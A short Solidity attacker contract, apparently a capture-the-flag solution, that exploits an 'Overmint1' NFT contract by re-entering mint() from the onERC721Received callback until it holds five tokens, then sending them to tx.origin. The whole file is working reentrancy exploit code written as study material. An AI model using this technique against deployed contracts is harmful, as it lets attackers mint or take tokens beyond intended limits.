// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {Overmint1} from "../Overmint1.sol";

contract Overmint1Attacker {
    Overmint1 victimContract;

    constructor(address _victimContract) {
        victimContract = Overmint1(_victimContract);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        if (victimContract.balanceOf(address(this)) < 5) {
            victimContract.mint();
        } else {
            for (uint256 i = 1; i < 6; ++i) {
                victimContract.transferFrom(address(this), tx.origin, i);
            }
        }
        return this.onERC721Received.selector;
    }

    function attack() external {
        victimContract.mint();
    }
}
